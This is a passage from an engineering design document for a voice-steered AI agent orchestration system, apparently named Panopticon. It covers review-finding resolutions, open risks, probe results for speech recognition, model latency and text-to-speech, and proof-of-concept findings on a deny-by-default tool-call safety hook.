| **ENG-A-15** | **Hot-loop DecisionLLM routed through Smithers subscriptions (no raw key); one `SubscriptionCredentialProvider`; fail-closed redaction filter; secret-redaction tests on every probe + whole-session secret-scan** | **R15.** PRD §6 binds all model calls to subscriptions with no raw keys; the prior draft left an undeclared secrets/dependency path. (`subscription-mediated-credentials.html`) |
| **ENG-A-16** | **PRD-literal output & consent alignment: consent states "Only transcripts are saved"; mute = earcon + one-word TTS; halt = earcon + ≤15-word TTS; all read-backs ≤15 words; per-process pause/resume magic words** | **R11/R12/R13.** Engineering output policy and vocabulary are aligned to the literal ACs (AC1.1/AC2.4/AC12.3/AC9.3) and REQ-13's per-process pausability rather than deviating. (`prd-literal-alignment.html`) |

**HTML decision docs** (self-contained, under `artifacts/smithering/decisions/`):

- `concurrency-planes.html` — the three-plane architecture (**ENG-A-01**)
- `provider-test-boundary.html` — provider interface as the universal test boundary (**ENG-A-02**)
- `cue-smithers-seam.html` — the owned async bidirectional seam (**ENG-A-03**)
- `invariants-in-code.html` — routing/safety authority in code, not the LLM (**ENG-A-04**)
- `probe-gating.html` — dependency→probe mapping & blocking classification (**ENG-A-06**)
- `safety-execution-boundary.html` — the in-run PreToolUse hook + safe-executor (**ENG-A-08**, R1)
- `hot-plane-cue-recognition.html` — earcon fed by Cue `TextCue`, recognition on Cue (**ENG-A-09**, R4)
- `addressed-pass-ack.html` — four distinct pass-acks; AC6.4 as-written, silence behind amendment (**ENG-A-10**, R6/R14)
- `execution-modes.html` — Safe / Explicit / Dangerous postures (**ENG-A-11**, R7)
- `shell-classifier-policy.html` — the deterministic shell-command classifier (**ENG-A-12**, R9)
- `unmute-recovery.html` — voice-unmute as sole operational unmute; emergency = kill-all + restart (**ENG-A-13**, R10)
- `replay-corpus-contract.html` — the annotated replay corpus artifact contract (**ENG-A-14**, R16)
- `subscription-mediated-credentials.html` — subscription-routed model calls, no raw keys, redaction (**ENG-A-15**, R15)
- `prd-literal-alignment.html` — consent/mute/halt/read-back/per-process-pause alignment to literal ACs (**ENG-A-16**, R11/R12/R13)

### 20.1 Adversarial review findings → resolution map (first round, R1–R8)

| # | Severity | Finding | Resolved in |
|---|---|---|---|
| R1 | critical | Safety gate not enforceable at the Smithers execution boundary | §8 (in-run PreToolUse hook + safe-executor, deny-by-default), §9 (approval round-trip), §17 (P-HOOK), ENG-A-08 |
| R2 | major | REQ-1 consent & transcript-only persistence not engineered | §12 (consent scheduler, listening indicator, whole-session persistence guard) |
| R3 | major | REQ-4 acceptance→spawn path missing state and tests | §7 (pending state, MCQ accumulation, accept/decline classifier, auto-select, planning, decline no-op) |
| R4 | major | Hot-plane ack conflicts with Cue as command substrate | §3.4 (earcon fed by Cue `TextCue`), §1.2, ENG-A-09, P-CUE latency assertion |
| R5 | major | REQ-10 timeout acknowledgement undefined | §5.4 ("working" timeout ack), §5.5 triage, `OutputDecision` |
| R6 | major | REQ-6 audible pass ack unresolved vs. silence | §4.2 (addressed vs. ambient pass), ENG-A-10 — *superseded by R14: now implemented as-written* |
| R7 | major | Command vocabulary not fully in the action contract | §4.3 (status/pause-all + handlers), §8.3 (explicit + dangerous modes), `DispatchedAction` extended |
| R8 | major | REQ-15 pre-spawn resource check absent | §10.1 (capacity + headroom gates, refusal ack, observability, tests) |

### 20.2 Adversarial review findings → resolution map (second round, R9–R16)

| # | Severity | Finding | Resolved in |
|---|---|---|---|
| R9 | **critical** | Safety hook gates `shell` wholesale → Safe collapses into Explicit (violates AC11.1); no defined read/destructive shell policy | **§8.1.1** (deterministic parse-based shell classifier: read-safe ungated; mutating/unknown/redirect/injection/compound gated, deny-by-default), §8.1 step 2, tests for safe/destructive/unknown/compound/redirect/injection/fuzz, **P-SHELL-PARSE**, ENG-A-12 |
| R10 | major | Emergency stop (REQ-14) wrongly reused as an unmute fallback | **§5.3.1 + §11** (voice-unmute via spotter is the sole operational unmute; **P-SPOTTER raised to blocking**; REQ-14 is kill-all + session-end only, spotter-down recovery = restart unmuted), ENG-A-13 |
| R11 | major | Per-process pause (REQ-13) has no deterministic voice command | **§4.3** ("[callsign], pause"/"resume" magic words + handlers), **§10** (per-UPID pause/resume lifecycle, the "steer A, pause B" path), routing + e2e tests, ENG-A-16 |
| R12 | major | Consent omits the AC1.1 transcript-only statement | **§12** (consent line now states "Only transcripts are saved"; consent-content test asserts it), ENG-A-16 |
| R13 | major | Output policy violates AC2.4 (mute TTS), AC12.3 (halt TTS), AC9.3 (read-back ≤15) | **§5.5 + §5.3 + §8.1** (mute = earcon + one-word TTS; halt = earcon + ≤15-word TTS; read-back ≤15), mute/halt/read-back-length tests, ENG-A-16 |
| R14 | major | Doc knowingly violated literal AC6.4 (silence for ambient pass) | **§4.2** (AC6.4 implemented as written — four distinct acks; silence is a knob unlocked only by a recorded PRD amendment), ENG-A-10 |
| R15 | major | Hot-loop model calls bypass the Smithers-subscription / no-raw-key constraint; no redaction tests | **§2.1 + §15.6** (one `SubscriptionCredentialProvider`; DecisionLLM via subscriptions; fail-closed redaction; secret-redaction tests on every probe + whole-session scan), **A-LLM-SUB**, ENG-A-15 |
| R16 | major | Annotated replay suite not engineered as a concrete artifact | **§15.5** (location, ≥60 min negatives + ≥50 positives, label schema, ≥2-labeler protocol with κ, dev/test split, shuffle-labels RBG, ownership — **ENG-T-07**), ENG-A-14 |

---

## 21. Open risks carried into implementation

- **R-ENG-01 (P0):** Cue repo unavailable / API differs from README → blocks REQ-1/3/5/6/7. P-CUE is
  the first build task (§17).
- **R-ENG-02 (P0, new):** Smithers may not expose a PreToolUse hook that can intercept-and-hold a tool
  call before execution → REQ-11 unenforceable as designed. **P-HOOK** is the gate; if it fails, the
  safe-executor must be realized another way (a constrained Smithers tool layer that wraps every
  mutating tool) or the optimistic-execution posture revisited with the PRD gate.
- **R-ENG-03:** TTS first-byte latency unverified → P-TTS validates *and* selects the provider.
- **R-ENG-04:** Cue↔Smithers seam (P-SEAM) — no prior art; async dispatch + SSE-reconnect + UPID↔window
  correlation + the safety approval round-trip must all hold.
- **R-ENG-05 (raised, R10):** The on-device spotter is now **on the critical path** (sole operational
  unmute, REQ-2/D1) — **P-SPOTTER is blocking**. If unavailable on a host, there is **no in-session
  unmute**: recovery is the REQ-14 kill-all + fresh-session restart (unmuted). Not a soft degrade.
- **R-ENG-06:** Smithers fork semantics — may require fresh seeded run + `parentId` lineage; P-SMITHERS
  determines the pattern.
- **R-ENG-07:** Bun native-module compat for the spotter (P-BUN-NATIVE) — gates only the voice-unmute
  path.
- **R-ENG-08:** Deepgram diarization under real in-room crosstalk — tested in P-ASR with 2-speaker
  simultaneous speech.
- **R-ENG-09:** Fable model reachability (per `intake.md`, may be disabled) — per-process planning
  model needs a documented fallback; does **not** affect the hot loop (cheap/fast LLM regardless).
- **R-ENG-10 (process, R14):** The build is now AC6.4-compliant by default (four distinct acks). A PRD
  amendment is **recommended but no longer required** to declare silence the intended ambient-pass ack;
  if adopted, flip `ambientPassAck:'silent'` (§4.2). Surfaced to the gate as a recommendation.
- **R-ENG-11 (R9):** A shell-parser miss could mis-classify a destructive command as `read-safe`.
  Mitigated by deny-by-default (unparseable → `unknown` → gated) + heavy fuzz/injection tests; gated by
  **P-SHELL-PARSE**. The read-safe allowlist is curated and append-only-by-review.
- **R-ENG-12 (R15):** The cheap/fast hot-loop model may not be reachable **through Smithers
  subscriptions** at the ~100 ms budget (PRD §6 forbids raw keys). **A-LLM-SUB** must resolve this; if
  no subscription-routable model meets the budget, it is a **binding PRD-§6 conflict** for the gate
  (amend §6 with secure credential handling, or accept a slower compliant model), not an
  engineer-around.
- **R-ENG-13 (R16):** The annotated corpus is human-labeled; label quality (κ) and representativeness of
  real team-room speech bound the trustworthiness of the AC3.4 metric. Mitigated by ≥2-labeler
  adjudication, the shuffle-labels RBG, and held-out test/dev separation (ENG-T-07, §15.5).

---

## 22. Probe results & required plan amendments — round 1 (2026-06-14)

Five assumption probes ran against **real APIs and the real Smithers harness**. Evidence lives under
`artifacts/smithering/probes/<id>/evidence/` (the durable record). **3 of 4 blocking probes failed →
the pipeline is paused for human approval of the amendments below.** One probe (`durable-voice-…`)
returned a *null* structured result to the orchestrator but its on-disk `assessment.json`/`RESULT.md`
show **PASS**; it is recorded as passed per disk evidence (A3).

| Probe (assumption id) | Maps to §17 | Verdict (per disk evidence) | Blocking |
|---|---|---|---|
| `assumption-stt-realtime-latency` | P-ASR / P-CUE | **FAIL (conditional)** — streaming first-word 280–409 ms ✅; diarization **unverified** (no DEEPGRAM_API_KEY); Cue has **no built-in Deepgram provider** | YES |
| `assumption-cheap-model-hot-loop` | P-LLM / A-LLM-SUB | **FAIL (gates)** — quality strong (100 % precision, ≥85 % recall) ✅; OpenAI p95 2440 ms ✗; Cerebras $0.1007/hr just over the $0.10 gate ✗; intended Haiku-tier model untested (no Anthropic credits) | YES |
| `assumption-durable-voice-steerable-processes` | P-SMITHERS / P-SEAM | **PASS** — spawn/persist(8 h)/concurrent/signal all proven; Cue voice seam is *build-required* (setup) | YES → **passed** |
| `assumption-tts-earcon-distinguishable` | P-TTS | **FAIL (2 thresholds)** — earcon↔speech distinguishable 8.15× ✅; `say` latency 1.27 s (file synth, not streaming API) ✗; compound-earcon ZCR-CV 0.18 > 0.15 ✗ | NO |
| `assumption-spoken-affirmative-detection` | P-CUE TextCue / §6–§7 accept flow | **FAIL** — STT fine (89.5 %); keyword-only matching gives **80 % context FP** and **53 % natural false-accept** | YES |

### A1 — ASR / Cue transcription (`stt-realtime-latency`) — BLOCKING

1. **Latency CONFIRMED** (no change): `gpt-4o-transcribe` streaming delivers first-word deltas in
   280–409 ms, full 4.53 s clip transcribed in 410 ms — inside the passive-listening budget. Batch
   Whisper-1 (2165 ms, 0.48× RT) is unsuitable for the hot loop, as designed.
2. **Diarization UNVERIFIED — re-run required.** `gpt-4o-transcribe-diarize` returns flat text, **no
   `utterances`/`segments`/`words`/speaker fields**. Deepgram Nova-3 (the §17 P-ASR target) could
   **not** be tested — no `DEEPGRAM_API_KEY`. Acquire the key and run P-ASR against Deepgram Nova-3
   WebSocket to validate the `isFinal` flag shape, `speaker_0/1` labels, and <300 ms word-final
   latency **before** any `SpeakerChangedCue`/two-channel routing is built. **Fallback if Deepgram is
   unavailable:** redesign the observation layer to operate **without speaker labels** (energy/VAD
   turn detection).
3. **NEW SCOPE — Cue audio bridge.** Cue's real providers are `qwen-asr` (passive WebSocket JSON
   *receiver*) and `voxterm` (markdown file poller); there is **no built-in Deepgram provider**. The
   design's "Cue pulls audio from Deepgram" path **does not exist**. Add a named component to §1/§3
   and a new ticket (**ENG-T-10: audio-capture → streaming ASR → JSON transcript events → Cue
   WebSocket `/sessions/:id/transcription`**). Update P-ASR/P-CUE accordingly.
4. **gpt-realtime session schema.** GA API rejects `session.modalities` (unknown) and requires
   `session.type`. Barge-in via server VAD is confirmed (`interrupt_response:true` in
   `session.created`). Fix the `session.update` schema before considering gpt-realtime as a Cue
   backend.

### A2 — cheap/fast hot-loop model (`cheap-model-hot-loop`) — BLOCKING

1. **Quality CONFIRMED.** Both candidates hit **100 % precision** (zero false-positive interruptions)
   and ≥85 % recall on a 48-sample corpus — the "won't spam the room" core assumption holds.
2. **Provider: OpenAI API DISQUALIFIED on latency** (p95 2440 ms — a network/API artifact).
   Cerebras `gpt-oss-120b` meets latency (p95 **383 ms**). The plan's Cerebras-or-local choice
   (§3.4/§17) is **validated**.
3. **Raise the cost gate $0.10 → $0.15/hr.** Cerebras came in at $0.1007/hr — a rounding artifact of
   verbose output tokens and full-corpus assumptions; with Cue's pre-filter + a tighter output schema
   real cost is <$0.05/hr.
4. **A-LLM-SUB still OPEN (PRD §6 compliance).** The intended Haiku-tier model
   `claude-haiku-4-5-20251001` was **not** tested — the Anthropic account had zero credits, and the
   probe called Cerebras **directly**, not through Cue's provider slot. Re-run P-LLM/A-LLM-SUB against
   `claude-haiku-4-5` **through Smithers subscriptions** when credits are restored, and have P-CUE
   confirm the Cue LLM provider slot accepts a Cerebras base-URL override. The R-ENG-12 / PRD-§6
   conflict is **not yet resolved**.
5. **Prompt fix.** Add "*or a status/information query addressed to a named callsign*" to the ACT
   criteria (closes the missed `a15` "Daybreak, what's your current status?").

### A3 — durable voice-steerable processes (`durable-voice-steerable-processes`) — PASSED (setup only)

All four Smithers gates pass against the real harness: durable **spawn** (stable run IDs), **persist**
(29 `WaitForEvent` runs alive 8+ h in SQLite), **concurrent** (no mutual exclusion), **signal/steer**
(loop advanced iteration 0→1 after resume; gateway processes signals in real time — 3 iterations in
26 s). No design change to the §9/§10 lifecycle.

- **Architectural note (not a design change):** real-time voice steering requires **gateway mode**
  (`smithers up --serve`, the existing `.smithers/gateway.ts`), **not** detach mode (`up -d`, which
  needs `--resume`). The Cue adapter must call the **gateway signal API**, not the CLI.
- **Setup tasks:** (1) **install Cue from source** (private pnpm monorepo: `git clone … && pnpm
  install && pnpm build`) before P-CUE/P-SEAM; (2) document that Panopticon processes launch via the
  gateway, not standalone `up -d`. The adapter (`cue-voice-adapter.ts`: `WordCue → MappedActionTool →
  smithers signal`) is written and type-correct but unexercised until Cue is built.
- **Note:** orchestrator captured a null structured result for this probe; recorded as **PASS** per
  `assessment.json`/`RESULT.md`. P-SMITHERS is effectively satisfied; **P-SEAM remains UNRUN** (needs
  the Cue build).

### A4 — earcon vs. TTS distinguishability (`tts-earcon-distinguishable`) — NON-BLOCKING

1. **Distinguishability CONFIRMED** — TTS ZCR-CV 1.44 vs Layer-A earcon mean 0.18 = **8.15×** (target
   >4×). Signal types are acoustically distinct.
2. **TTS latency failure is a measurement artifact** — 1.27 s was macOS `say` (file-based), not a
   streaming API. Run a P-TTS follow-up against a **streaming** TTS API (OpenAI `/v1/audio/speech` or
   ElevenLabs) measuring **time-to-first-audio-chunk**, and **pre-cache the five fixed state phrases**
   as static clips for <100 ms playback.
3. **Earcon redesign** to bring compound-earcon ZCR-CV under 0.15: E5-halt — narrow the E5→C4 drop to
   an octave (E5→C5) or add an intermediate tone; E4-resolve — reduce the C4→E4 inter-tone gap.
4. **Human in-room perceptual test required** before the §5 earcon vocabulary is finalized (protocol
   in the probe README; record to `evidence/human-test.json`).

### A5 — spoken-affirmative / magic-word detection (`spoken-affirmative-detection`) — BLOCKING

STT quality is **not** the bottleneck (89.5 % accuracy). **Keyword-only `TextCue` matching is
insufficient** to gate process spawning: context false-positive rate **80 %** ("Yes, but I'm not sure
we should do that.") and natural false-accept rate **53 %** (ordinary technical speech contains
`accept`/`confirm`/`alpha`/`bravo`/`charlie`/`delta`/`echo`). Required changes (preserve the Cue
`TextCue → Program → LLM → MappedActionTool` shape; add a **semantic gate** between keyword detection
and action emission — §3/§4/§6/§7):

1. **Two-step affirmative gating.** A `TextCue` keyword match must gate a **cheap LLM intent check**
   ("standalone command vs. conversational filler?") before any spawn/control action fires (~200–400 ms
   added to the spawn path). The current `TextCue → direct action` is **broken**.
2. **Callsign vocabulary must drop the NATO-alphabet subset** (`alpha/bravo/charlie/delta/echo` all
   occur in natural dev speech). Use **rare coined multi-syllable** callsigns (cf. "Daybreak" in §17 /
   §4.3). Amend the §4.3 V0 vocabulary accordingly.
3. **Whole-utterance pre-filter** (zero-cost): if the transcript is substantially just the affirmative
   with no adversative conjunction, accept; else send to the LLM intent check — eliminates "yes, but…"
   for free.
4. **Robustness note:** STT can run words together ("Delta, pause." → "DeltaPause."); the matcher must
   handle concatenated output rather than rely on a strict whole-word regex.

### New / changed tickets & gates from round 1

- **ENG-T-10 (new):** audio-capture → streaming-ASR → Cue-WebSocket bridge (A1.3) — was assumed
  implicit; is real, unplanned scope.
- **§4 / §6 / §7 (amend):** insert the cheap-LLM **intent gate** between `TextCue` and any
  spawn/control action (A5.1); whole-utterance pre-filter (A5.3).
- **§4.3 (amend):** replace NATO-subset callsigns with coined multi-syllable words (A5.2).
- **§5 (amend):** earcon redesign for E4/E5 (A4.3); pre-cache fixed state phrases (A4.2).
- **Cost gate (amend §17 / R-ENG-12):** $0.10/hr → $0.15/hr (A2.3).
- **Still-OPEN blocking gates:** P-ASR-Deepgram (A1.2), A-LLM-SUB / Haiku-via-subscription (A2.4),
  P-SEAM (needs Cue build, A3), P-TTS-streaming + human earcon test (A4). Build does **not** proceed
  on the affected paths until these pass.

---

## 23. POC findings — safety hook approval round-trip (2026-06-14)

A throwaway POC (`artifacts/smithering/poc/safety-hook-approval-roundtrip/`) built and tested the
riskiest unproven architectural slice: the §8 safety hook approval round-trip. **59/59 headless
tests pass; 2 skipped (require `PANOPTICON_E2E=1` + API key).** Full findings in
`artifacts/smithering/poc/safety-hook-approval-roundtrip/FINDINGS.md`. Critical amendments:

### POC-A1 (HIGH) — PreToolUse hook mechanism relies on Claude Code CLI's `settings.json`, not a Smithers-native API

**Evidence:** Full type inspection of `smithers-orchestrator@0.23.0`. No `PreToolUse`,
`beforeToolCall`, `toolInterceptor` or equivalent Smithers runtime API exists. The
`snapshot-hook.d.ts` mechanism IS the hook system — it is **Claude Code CLI's own
`settings.json` PreToolUse hook**, not a Smithers primitive.

**Required amendment to §8.1:** Add the following after the opening paragraph:

> **Agent constraint (POC-A1):** The PreToolUse hook fires via Claude Code CLI's
> built-in `settings.json` hook mechanism — not a Smithers-native API. Therefore
> every Panopticon process that requires the safety gate **MUST use `ClaudeCodeAgent`
> (Claude Code CLI)** as its agent implementation. Processes using `AnthropicAgent`
> (direct Anthropic SDK calls) bypass this hook entirely and cannot be used for
> safety-gated work. The `settings.json` hook entry must configure `timeoutMs > 25000`
> and `onFailure: "block"` to ensure hook failure denies (not allows) the tool call
> if the dead-man timer fires.

**Tickets affected:** `probe-pretool-safety-hook`, `safety-execution-boundary-hook`.

### POC-A2 (MEDIUM) — Hook timeout coordination: Claude Code must be configured with `timeoutMs > 25000`

**Finding:** If Claude Code's hook timeout is ≤ the dead-man timer (25 s), Claude Code may
kill the hook process before it fires, with uncertain `onFailure` behavior. The `settings.json`
entry must set `timeoutMs: 30000` (or higher) AND `onFailure: "block"` so that a killed hook
defaults to deny, not allow.

**Tickets affected:** `safety-execution-boundary-hook`.

### POC-A3 (LOW) — `shell-quote` not installed; add to P-SHELL-PARSE scope

**Finding:** The `shell-quote` parser is not in `node_modules/`. A regex-based classifier
was built for the POC and validated in 59 tests. The P-SHELL-PARSE probe must also confirm
`shell-quote` handles compound commands, redirections, and injection constructs correctly before
the production classifier builds on it. **No design change; confirms P-SHELL-PARSE is blocking.**

### POC-A4 (HIGH) — gateId↔UPID correlation gap in seam design

**Finding:** The approval request from the hook carries a `gateId` (minted in the hook). For
the voice dispatcher to resolve it, the seam must maintain a `gateId → upid` mapping and a
`upid → pending gateId` cache so "confirm" for a given UPID calls `resolve(gateId, "approve")`.
**This per-UPID mapping is not specified in the current §9 seam design.** Add to §9
(`src/seam/dispatcher.ts`): the dispatcher maintains `pendingGates: Map<upid, gateId>`,
updated when an `approval` run-event arrives and cleared on resolution or dead-man timeout.
